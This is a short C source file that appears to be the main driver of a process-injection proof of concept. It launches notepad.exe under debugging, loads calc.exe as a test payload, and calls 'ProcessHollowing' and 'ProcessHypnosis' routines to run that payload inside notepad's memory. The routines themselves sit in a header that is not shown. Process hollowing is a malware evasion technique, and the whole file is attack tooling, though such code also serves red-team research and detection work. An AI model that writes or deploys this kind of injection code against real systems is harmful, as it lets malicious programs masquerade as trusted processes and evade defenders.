#include "box.h"

#define TARGET_PROCESS	"notepad.exe"
#define TEST_EXECUTABLE "C:\\Windows\\System32\\calc.exe"

int main()
{

	DWORD	PID = 0, 
			TID = 0,
			NumOfBytesToRead = 0,
			Delta = 0;

	HANDLE	hThread = NULL, 
			hProcess = NULL;

	LPVOID	lpBuffer = NULL,
			rBuffer = NULL,
			lpFile = NULL;


	if (!CreateDebugedProcess(TARGET_PROCESS, &TID, &PID, &hProcess, &hThread))
	{
		PRINT_ERROR("CreateDebugedProcess");
		return 1;
	}

	if (!ReadTargetFile(TEST_EXECUTABLE, &lpBuffer, &NumOfBytesToRead))
	{
		PRINT_ERROR("ReadTargetFile");
		return 1;
	}

	if (!ProcessHollowing(PID, hThread, hProcess, &rBuffer, lpBuffer, &Delta))
	{
		PRINT_ERROR("ProcessHollowing");
		return 1;
	}

	if (!ProcessHypnosis(lpBuffer, &rBuffer, PID, hProcess))
	{
		PRINT_ERROR("ProcessHypnosis");
		return 1;
	}

	OKAY("DONE!");

	CHAR("Quit...");
	getchar();

	CloseHandle(hProcess);
	CloseHandle(hThread);
	VirtualFree(rBuffer, 0, MEM_RELEASE);

	return 0;

}